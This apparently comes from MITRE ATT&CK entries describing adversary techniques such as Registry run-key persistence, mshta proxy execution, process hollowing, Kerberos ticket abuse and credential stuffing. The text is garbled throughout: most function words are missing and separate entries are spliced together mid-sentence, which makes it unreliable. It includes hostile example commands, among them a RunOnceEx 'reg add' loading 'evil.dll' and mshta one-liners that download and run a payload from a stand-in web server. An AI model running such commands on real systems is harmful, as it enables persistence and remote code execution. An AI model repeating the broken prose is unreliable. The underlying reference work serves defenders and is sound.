There notable incidents internal spearphishing used. Eye Pyramid campaign phishing emails malicious attachments lateral movement victims, compromising 18,000 email accounts process.(Citation: Trend Micro Phishing Starts 2017) Syrian Electronic Army (SEA) compromised email accounts Financial Times (FT) steal additional account credentials. FT learned campaign warning employees threat, SEA phishing emails mimicking Financial Times department compromise users.(Citation: FINANCIAL TIMES 2019.) sudoers file, <code>/etc/sudoers</code>, describes users commands terminals. describes commands users users groups. idea privilege users running lowest permissions time elevate users permissions needed, typically prompting password. However, sudoers file prompt users passwords <code>user1 ALL=(ALL) NOPASSWD: ALL</code> (Citation: OSX.Dok Malware). 

Adversaries advantage configurations execute commands users spawn processes privileges. elevated privileges edit file though. Adversaries execute malicious payloads hijacking binaries services. Adversaries flaws permissions Windows services replace binary executed service start. service processes automatically execute specific binaries functionality perform actions. permissions file directory target binary, permissions binary improperly set, target binary overwritten binary user-level permissions executed original process. original process thread running permissions level, replaced binary execute higher-level permissions, include SYSTEM.

Adversaries technique replace legitimate binaries malicious executing code permissions level. executing process set specific time event bootup) technique persistence. Adversaries achieve persistence adding program startup folder referencing Registry key. Adding entry "run keys" Registry startup folder program referenced executed user logs in.(Citation: Key) programs executed context user account's permissions level.

Placing program startup folder program execute user logs in. startup folder location individual user accounts system-wide startup folder checked user account logs in. startup folder path current user <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. startup folder path users <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>.

The created default Windows systems:

* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

Run exist multiple hives.(Citation: Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> created default Windows Vista newer. Registry key entries reference programs list dependency.(Citation: Key) example, load DLL logon "Depend" key RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

The Registry set startup folder items persistence:

* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Folders</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Folders</code>

The Registry control automatic startup services boot:

* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

Using policy settings startup programs creates values Registry keys:

* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

The Winlogon key controls actions occur user logs running Windows 7. actions control operating system, add custom actions here. <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> subkeys automatically launch programs.

Programs listed load registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> user logs on.

By default, multistring <code>BootExecute</code> registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> set <code>autocheck autochk *</code>. Windows, startup, check file-system integrity hard disks shut abnormally. Adversaries add programs processes registry automatically launch boot.

Adversaries configuration locations execute malware, remote access tools, maintain persistence reboots. Adversaries [Masquerading](https://attack.mitre.org/techniques/T1036) Registry entries legitimate programs. Adversaries breach leverage organizations access intended victims. Access trusted party relationship abuses existing connection protected receives scrutiny standard mechanisms gaining access network.

Organizations grant elevated access third-party external providers manage internal systems cloud-based environments. examples relationships include services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). third-party provider's access intended limited infrastructure maintained, exist network rest enterprise. such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) party access internal network systems compromised used.(Citation: CISA Service Providers)

In Office 365 environments, organizations grant partners resellers delegated administrator permissions. compromising partner reseller account, adversary leverage existing delegated administrator relationships send delegated administrator offers clients gain administrative control victim tenant.(Citation: Office 365 Delegated Administration) Adversaries create cloud account maintain access victim systems. sufficient level access, accounts establish secondary credentialed access require persistent remote access tools deployed system.(Citation: O365 Admin Roles)(Citation: Support O365 Add Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Azure Users)

Adversaries create accounts access specific cloud services, reduce chance detection. Adversaries attempt local permission settings. knowledge local permission adversaries determine exist users belong group. Adversaries determine users elevated permissions, users local administrators group.

Commands <code>net localgroup</code> [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> macOS, <code>groups</code> Linux list local groups. **This technique deprecated used.**

As OS 10.8, mach-O binaries introduced header called LC_MAIN binary’s entry execution. Previously, headers achieve effect: LC_THREAD LC_UNIXTHREAD  (Citation: Prolific OSX Malware History). entry binary hijacked initial execution flows malicious addition (either code cave) initial entry victim doesn’t  (Citation: Methods Mac Malware Persistence). modifying binary way, application whitelisting bypassed file application path same. Adversaries search freely websites domains victims targeting. victims online sites, social media, sites, hosting business operations hiring requested/rewarded contracts.(Citation: Cyware Social Media)(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)

Adversaries search online sites depending seek gather. sources reveal opportunities forms reconnaissance (ex: [Phishing Information](https://attack.mitre.org/techniques/T1598) [Search Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) [Phishing](https://attack.mitre.org/techniques/T1566)). Adversaries manipulate accounts maintain access victim systems. Account manipulation consist action preserves adversary access compromised account, modifying credentials permission groups. actions include account activity designed subvert security policies, performing iterative password updates bypass password duration policies preserve life compromised credentials. 

In create manipulate accounts, adversary sufficient permissions systems domain. However, account manipulation lead privilege escalation modifications grant access additional roles, permissions, higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078). Mshta.exe utility executes Applications (HTA). HTA files file extension <code>.hta</code>. (Citation: Wikipedia Application) HTAs standalone applications execute models technologies Internet Explorer, browser. (Citation: MSDN Applications)

Adversaries mshta.exe proxy execution malicious .hta files Javascript VBScript trusted Windows utility. examples types threats leveraging mshta.exe initial compromise execution code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Files executed mshta.exe inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>

They executed URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe bypass application whitelisting solutions account potential use. mshta.exe executes Internet Explorer's security context, bypasses browser security settings. (Citation: LOLBAS Mshta) Adversaries steal data exfiltrating protocol existing command control channel. data alternate network location main command control server.  

Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, network protocol main command control channel. protocol channels include services cloud storage. Adversaries opt encrypt obfuscate alternate channels. 

[Exfiltration Alternative Protocol](https://attack.mitre.org/techniques/T1048) common operating utilities [Net](https://attack.mitre.org/software/S0039)/SMB FTP.(Citation: Palo Alto OilRig Oct 2016) macOS Linux <code>curl</code> invoke protocols HTTP/S FTP/S exfiltrate data system.(Citation: 20 macOS Common Tools Techniques)  Adversaries modify kernel automatically execute programs boot. Loadable Kernel Modules (LKMs) pieces code loaded unloaded kernel demand. extend functionality kernel reboot system. example, type module device driver, kernel access hardware connected system.(Citation: Linux Kernel Programming) 

When maliciously, LKMs type kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) operating privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide) Common features LKM based rootkits include: hiding itself, selective hiding files, processes network activity, log tampering, providing authenticated backdoors, enabling root access non-privileged users.(Citation: iDefense Rootkit Overview)

Kernel extensions, called kext, macOS load functionality LKMs Linux. kernel responsible enforcing security kernel extensions kernel, kexts governed macOS security policies. Kexts loaded unloaded <code>kextload</code> <code>kextunload</code> commands. Kexts signed developer granted privileges Apple allowing sign Kernel extensions. Developers privileges sign kexts load SIP disabled. SIP enabled, kext signature verified AuxKC.(Citation: kernel extensions macOS)

Since macOS Catalina 10.15, kernel extensions deprecated favor Extensions. However, kexts allowed "Legacy Extensions" Extension Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)

Adversaries LKMs kexts conduct [Persistence](https://attack.mitre.org/tactics/TA0003) [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) system. Examples wild, relevant source projects well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap) Adversaries mimic common operating GUI components prompt users credentials seemingly legitimate prompt. programs executed additional privileges current user context, common operating prompt user proper credentials authorize elevated privileges task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).

Adversaries mimic functionality prompt users credentials seemingly legitimate prompt reasons mimic normal usage, fake installer requiring additional access fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) type prompt collect credentials languages [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Trust Oct 2014)(Citation: Enigma Phishing Credentials Jan 2015)(Citation: Spoofing credential dialogs) Linux systems adversaries launch dialog boxes prompting users credentials malicious scripts command [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)  Pass ticket (PtT) method authenticating Kerberos tickets access account's password. Kerberos authentication step lateral movement remote system.

In technique, valid Kerberos tickets [Valid Accounts](https://attack.mitre.org/techniques/T1078) captured [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). user's service tickets ticket granting ticket (TGT) obtained, depending level access. service ticket access resource, TGT request service tickets Ticket Granting Service (TGS) access resource user privileges access. (Citation: ADSecurity Kerberos Attacks) (Citation: GentilKiwi Pass Ticket)

Silver Tickets services Kerberos authentication mechanism generate tickets access resource hosts resource SharePoint). (Citation: ADSecurity Kerberos Attacks)

Golden Tickets domain Key Distribution Service account KRBTGT account NTLM hash, enables generation TGTs account Active Directory. (Citation: Campbell 2014) Adversaries buy, steal, download software tools targeting. Tools closed source, commercial. tool malicious purposes adversary, (unlike malware) intended purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition involve procurement commercial software licenses, including red teaming tools [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software purchase, stealing licenses (or licensed copies software), cracking trial versions.(Citation: Recorded Future Beacon 2019)

Adversaries tools support operations, including support execution post-compromise behaviors. addition freely downloading purchasing software, adversaries steal software software licenses third-party entities (including adversaries). Adversaries attempt exfiltrate data USB connected physical device. circumstances, air-gapped network compromise, exfiltration occur USB device introduced user. USB device final exfiltration hop disconnected systems. Adversaries abuse <code>KernelCallbackTable</code> process hijack execution flow payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) <code>KernelCallbackTable</code> Process Environment Block (PEB) initialized array graphic functions GUI process <code>user32.dll</code> loaded.(Citation: Windows Process Injection KernelCallbackTable)

An adversary hijack execution flow process <code>KernelCallbackTable</code> replacing original callback function malicious payload. Modifying callback functions achieved involving behaviors [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) [Process Injection](https://attack.mitre.org/techniques/T1055) process.

A pointer memory address <code>KernelCallbackTable</code> locating PEB (ex: <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) pointer located, <code>KernelCallbackTable</code> duplicated, function table <code>fnCOPYDATA</code>) set address malicious payload (ex: <code>WriteProcessMemory()</code>). PEB updated address table. tampered function invoked, malicious payload triggered.(Citation: Lazarus APT January 2022)

The tampered function typically invoked Windows message. process hijacked malicious code executed, <code>KernelCallbackTable</code> restored original rest malicious payload.(Citation: Lazarus APT January 2022) <code>KernelCallbackTable</code> hijack execution flow evade detection security products execution masked legitimate process. Adversaries search gather victims closed sources targeting. victims purchase reputable private sources databases, paid subscriptions feeds technical/threat intelligence data.(Citation: D3Secutrity CTI Feeds) Adversaries purchase less-reputable sources dark cybercrime blackmarkets.(Citation: ZDNET Selling Data)

Adversaries search closed databases depending seek gather. sources reveal opportunities forms reconnaissance (ex: [Phishing Information](https://attack.mitre.org/techniques/T1598) [Search Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) [Valid Accounts](https://attack.mitre.org/techniques/T1078)). Adversaries abuse systemd timers perform task scheduling initial recurring execution malicious code. Systemd timers unit files file extension <code>.timer</code> control services. Timers set calendar event time span relative starting point. alternative [Cron](https://attack.mitre.org/techniques/T1053/003) Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers activated remotely <code>systemctl</code> command utility, operates [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: Systemd Remote Control)

Each <code>.timer</code> file <code>.service</code> file name, e.g., <code>example.timer</code> <code>example.service</code>. <code>.service</code> files [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files managed systemd service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers written <code>/etc/systemd/system/</code> <code>/usr/lib/systemd/system</code> user level written <code>~/.config/systemd/user/</code>.

An adversary systemd timers execute malicious code startup scheduled basis persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed privileged paths maintain root level persistence. Adversaries install user level timers achieve user level persistence. Adversaries send phishing messages gain access victim systems. forms phishing electronically delivered social engineering. Phishing targeted, spearphishing. spearphishing, specific individual, company, industry targeted adversary. generally, adversaries conduct non-targeted phishing, mass malware spam campaigns.

Adversaries send victims emails malicious attachments links, typically execute malicious code victim systems. Phishing conducted third-party services, social media platforms. Phishing involve social engineering techniques, posing trusted source. **This technique deprecated. [Remote Services](https://attack.mitre.org/techniques/T1021) appropriate.**

The Graphical User Interfaces (GUI) common interact operating system. Adversaries system's GUI operation, commonly remote interactive session [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076), [Command Scripting Interpreter](https://attack.mitre.org/techniques/T1059), search execute files mouse double-click events, Windows command (Citation: Wikipedia Command), difficult monitor interactions. Adversaries abuse ROM Monitor (ROMMON) loading unauthorized firmware adversary code provide persistent access manipulate device behavior difficult detect. (Citation: Cisco Synful Knock Evolution)(Citation: Cisco Blog Legacy Device Attacks)


ROMMON Cisco network device firmware functions boot loader, boot image, boot helper initialize hardware software platform powered reset. [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), adversary upgrade ROMMON image locally remotely (for example, TFTP) adversary code restart device overwrite existing ROMMON image. adversaries update ROMMON gain persistence difficult detect. Adversaries abuse Compiled files (.chm) conceal malicious code. CHM files commonly distributed system. CHM files compressed compilations content documents, images, scripting/web programming languages VBA, JScript, Java, ActiveX. (Citation: 2018) CHM content displayed underlying components Internet Explorer browser (Citation: ActiveX) loaded executable program (hh.exe). (Citation: Executable Program)

A custom CHM file embedded payloads delivered victim triggered [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution bypass application application control unpatched systems account execution binaries hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: CVE-2017-8625 Aug 2017) Adversaries remove share connections clean traces operation. Windows shared drive [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections removed needed. [Net](https://attack.mitre.org/software/S0039) utility remove network share connections <code>net \\system\share /delete</code> command. (Citation: Technet Use) disguise source malicious traffic, adversaries chain multiple proxies. Typically, defender identify proxy traffic traversed enters network; defender identify previous proxies last-hop proxy. technique identifying original source malicious traffic difficult requiring defender trace malicious traffic proxies identify source. variant behavior onion routing networks, publicly TOR network. (Citation: Onion Routing)

In network infrastructure, routers, adversary leverage multiple compromised devices create multi-hop proxy chain Wide-Area Network (WAN) enterprise.  leveraging [Patch Image](https://attack.mitre.org/techniques/T1601/001), adversaries add custom code network devices implement onion routing nodes.  custom onion routing network transport encrypted C2 traffic compromised population, allowing adversaries communicate device onion routing network.  method dependent [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method adversaries cross protected network boundary Internet perimeter organization’s WAN. Protocols ICMP transport. Adversaries brute force techniques gain access accounts passwords unknown password hashes obtained. knowledge password account set accounts, adversary systematically guess password repetitive iterative mechanism. Brute forcing passwords interaction service check validity credentials offline acquired credential data, password hashes.

Brute forcing credentials breach. example, adversaries attempt brute force access [Valid Accounts](https://attack.mitre.org/techniques/T1078) victim environment leveraging knowledge gathered post-compromise behaviors [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries combine brute forcing activity behaviors [External Remote Services](https://attack.mitre.org/techniques/T1133) Initial Access. Adversaries abuse Unix commands scripts execution. Unix shells primary command prompt Linux macOS systems, variations Unix exist (e.g. sh, bash, zsh, etc.) depending specific OS distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells control aspect system, commands requiring elevated privileges.

Unix shells support scripts enable sequential execution commands typical programming operations conditionals loops. Common scripts include repetitive tasks, set commands multiple systems.

Adversaries abuse Unix shells execute commands payloads. Interactive shells accessed command control channels lateral movement [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries leverage scripts deliver execute multiple commands victims payloads persistence. Adversaries abuse Outlook forms persistence compromised system. Outlook forms templates presentation functionality Outlook messages. Custom Outlook forms created execute code crafted email adversary utilizing custom Outlook form.(Citation: SensePost Outlook Forms)

Once malicious forms user’s mailbox, loaded Outlook started. Malicious forms execute adversary sends crafted email user.(Citation: SensePost Outlook Forms) macOS OS common method required dynamic libraries (dylib) load program based search paths. Adversaries advantage ambiguous paths plant dylibs gain privilege escalation persistence.

A common method dylibs application uses, plant malicious version search path. typically dylib folder application itself. (Citation: Writing Bad Malware OSX) (Citation: Malware Persistence OS X)

If program configured privilege level current user, dylib loaded application, dylib elevated level. adversaries privilege escalation technique. Adversaries modify disable security tools avoid detection malware/tools activities. forms, killing security software processes services, modifying / deleting Registry configuration files tools operate properly, methods interfere security tools scanning reporting information. Adversaries disable updates prevent security patches reaching tools victim systems.(Citation: SCADAfence_ransomware)

Adversaries tamper artifacts deployed utilized security tools. Security tools dynamic components maintain visibility specific events. example, security products load modules modify loaded processes facilitate data collection. [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries unhook modify features tools (especially exist userland accessible adversaries) avoid detection.(Citation: OutFlank Calls)(Citation: MDSec Calls)

In cloud environments, tools disabled adversaries include cloud monitoring agents report services AWS CloudWatch Google Cloud Monitor.

Furthermore, defensive tools anti-tampering mechanisms, adversaries abuse tools legitimate rootkit removal kits impair disable tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) example, adversaries tools GMER shut hidden processes antivirus software infected systems.(Citation: demystifying_ryuk)

Additionally, adversaries exploit legitimate drivers anti-virus software gain access kernel space [Exploitation Privilege Escalation](https://attack.mitre.org/techniques/T1068)), lead bypassing anti-tampering features.(Citation: avoslocker_ransomware) Adversaries insert, delete, manipulate data influence external outcomes hide activity, threatening integrity data. manipulating data, adversaries attempt affect business process, organizational understanding, decision making.

The type modification impact depends target application process goals objectives adversary. complex systems, adversary special expertise access specialized software typically gained prolonged gathering campaign desired impact. Adversaries abuse inter-process communication (IPC) mechanisms local code command execution. IPC typically processes share data, communicate other, synchronize execution. IPC commonly avoid situations deadlocks, occurs processes stuck cyclic waiting pattern. 

Adversaries abuse IPC execute arbitrary code commands. IPC mechanisms depending OS, typically exists form accessible programming languages/libraries native interfaces Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Linux environments support IPC mechanisms, sockets pipes.(Citation: Linux IPC) level execution mediums, [Command Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, leverage underlying IPC mechanisms. Adversaries [Remote Services](https://attack.mitre.org/techniques/T1021) [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) facilitate remote IPC execution.(Citation: Fireeye Hunting June 2019) Adversaries obfuscate command control traffic difficult detect. Command control (C2) communications hidden (but encrypted) attempt content difficult discover decipher communication conspicuous hide commands seen. encompasses methods, adding junk data protocol traffic, steganography, impersonating legitimate protocols.  Adversaries search network shares computers compromised files interest. Sensitive data collected remote systems shared network drives (host shared directory, network file server, etc.) accessible current prior Exfiltration. Interactive command shells use, common functionality [cmd](https://attack.mitre.org/software/S0106) gather information. Adversaries compromise access third-party services that targeting. variety popular websites exist legitimate users register web-based services, GitHub, Twitter, Dropbox, Google, etc. Adversaries ownership legitimate user's access service service infrastructure support cyber operations. services abused stages adversary lifecycle, Command Control ([Web Service](https://attack.mitre.org/techniques/T1102)) [Exfiltration Service](https://attack.mitre.org/techniques/T1567).(Citation: Recorded Future Turla Infra 2020) common services, offered Google Twitter, easier adversaries hide expected noise. utilizing service, access stolen legitimate users, adversaries difficult physically tie operations them. Adversaries operating embedded network devices weaken defenses provide capabilities themselves.  devices, operating systems typically monolithic device functionality capabilities contained single file.

To change operating system, adversary typically affect file, replacing modifying it.  live memory runtime effect, storage implement change boot network device. Adversaries execute malicious payloads hijacking operating systems programs. Hijacking execution flow purposes persistence, hijacked execution reoccur time. Adversaries mechanisms elevate privileges evade defenses, application control restrictions execution.

There adversary hijack flow execution, including manipulating operating locates programs executed. operating locates libraries program intercepted. Locations operating programs/resources, file directories Windows Registry, poisoned include malicious payloads. Adversaries remove indicators tools malicious tool detected, quarantined, curtailed. modify tool removing indicator updated version detected target's defensive systems subsequent targets systems.

A malware detected file signature quarantined anti-virus software. adversary determine malware quarantined file signature modify file explicitly avoid signature, re-use malware. Adversaries rely user running malicious image facilitate execution. Amazon Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, Azure Images popular container runtimes Docker backdoored. Backdoored images uploaded public repository [Upload Malware](https://attack.mitre.org/techniques/T1608/001), users download deploy instance container image realizing image malicious, bypassing techniques achieve Initial Access. lead execution malicious code, code executes cryptocurrency mining, instance container.(Citation: Summit Route Malicious AMIs)

Adversaries images increase chance users mistakenly deploying instance container image (ex: [Match Legitimate Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021) Adversaries abuse credentials existing accounts gaining Initial Access, Persistence, Privilege Escalation, Defense Evasion. Compromised credentials bypass access controls resources systems network persistent access remote systems externally services, VPNs, Outlook Access, network devices, remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials grant adversary increased privilege specific systems access restricted network. Adversaries choose malware tools conjunction legitimate access credentials provide harder detect presence.

In cases, adversaries abuse inactive accounts: example, belonging individuals organization. accounts adversary evade detection, original account user identify anomalous activity account.(Citation: CISA MFA PrintNightmare)

The overlap permissions local, domain, cloud accounts network systems concern adversary pivot accounts systems reach level access (i.e., domain enterprise administrator) bypass access controls set enterprise.(Citation: TechNet Credential Theft) Adversaries communicate protocol port paring typically associated. example, HTTPS port 8088(Citation: Symantec Elfin Mar 2019) port 587(Citation: Fortinet Agent Tesla April 2018) opposed traditional port 443. Adversaries standard port protocol bypass filtering muddle analysis/parsing network data. Adversaries create cultivate social media accounts targeting. Adversaries create social media accounts build persona operations. Persona development consists development public information, presence, history affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)

For operations incorporating social engineering, utilization persona social media important. personas fictitious impersonate real people. persona exist single social media multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing persona  social media require development additional documentation real. include filling profile information, developing social networks, incorporating photos. 

Once persona developed adversary create connections targets interest. connections direct include connect others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) accounts leveraged phases adversary lifecycle, Initial Access (ex: [Spearphishing Service](https://attack.mitre.org/techniques/T1566/003)). Programs DLLs loaded runtime. Programs improperly vaguely required DLL vulnerability unintended DLL loaded. Side-loading vulnerabilities occur Windows Side-by-Side (WinSxS) manifests (Citation: MSDN Manifests) explicit characteristics DLL loaded. Adversaries advantage legitimate program vulnerable side-loading load malicious DLL. (Citation: Stewart 2014)

Adversaries technique masking actions perform legitimate, trusted software process. Adversaries inject malicious code suspended hollowed processes evade process-based defenses. Process hollowing method executing arbitrary code address space separate live process.  

Process hollowing commonly performed creating process suspended unmapping/hollowing memory, replaced malicious code. victim process created native Windows API calls <code>CreateProcess</code>, includes flag suspend processes primary thread. process unmapped APIs calls <code>ZwUnmapViewOfSection</code> <code>NtUnmapViewOfSection</code>  written to, realigned injected code, resumed <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)

This [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) creates process targeting existing process. behavior result elevated privileges injected process spawned (and inherits security context) injecting process. However, execution process hollowing evade detection security products execution masked legitimate process.  Adversaries exploit software vulnerabilities attempt elevate privileges. Exploitation software vulnerability occurs adversary takes advantage programming error program, service, operating software kernel execute adversary-controlled code. Security constructs permission levels hinder access techniques, adversaries perform privilege escalation include software exploitation circumvent restrictions.

When initially gaining access system, adversary operating privileged process prevent accessing resources system. Vulnerabilities exist, operating components software commonly running permissions, exploited gain levels access system. enable unprivileged user level permissions root permissions depending component vulnerable. enable adversary virtualized environment, virtual machine container, underlying host. step adversary compromising endpoint properly configured limits privilege escalation methods.

Adversaries bring signed vulnerable driver compromised machine exploit vulnerability execute code kernel mode. process referred Bring Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries include vulnerable driver files delivered Initial Access download compromised [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570). Adversaries abuse resource forks hide malicious code executables evade detection bypass security applications. resource fork applications structured store resources thumbnail images, menu definitions, icons, dialog boxes, code.(Citation: macOS Hierarchical File Overview) Usage resource fork identifiable displaying file’s extended attributes, <code>ls -l@</code> <code>xattr -l</code> commands. Resource forks deprecated replaced application bundle structure. Non-localized resources level directory application bundle, localized resources <code>/Resources</code> folder.(Citation: Resource Data Forks)(Citation: ELC Extended Attributes)

Adversaries resource forks hide malicious data stored files. Adversaries execute content attached resource fork, offset, moved executable location invoked. Resource fork content obfuscated/encrypted execution.(Citation: sentinellabs resource named fork 2020)(Citation: tau bundlore erika noerenberg 2020) Adversaries interrupt availability network resources inhibiting access accounts utilized legitimate users. Accounts deleted, locked, manipulated (ex: changed credentials) remove access accounts. Adversaries subsequently log perform [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) set malicious place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)

In Windows, [Net](https://attack.mitre.org/software/S0039) utility, <code>Set-LocalUser</code> <code>Set-ADAccountPassword</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets adversaries modify user accounts. Linux, <code>passwd</code> utility change passwords. Accounts disabled Policy. 

Adversaries ransomware perform Impact behaviors, [Data Destruction](https://attack.mitre.org/techniques/T1485) [Defacement](https://attack.mitre.org/techniques/T1491), completing [Data Encrypted Impact](https://attack.mitre.org/techniques/T1486) objective.  Adversaries credentials breach dumps unrelated accounts gain access target accounts credential overlap. Occasionally, username password pairs dumped online service compromised user account credentials accessed. adversary attempting compromise accounts advantage tendency users passwords personal business accounts.

Credential stuffing risky option numerous authentication failures account lockouts, depending organization's login failure policies.

Typically, management services commonly ports stuffing credentials. Commonly targeted services include following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)

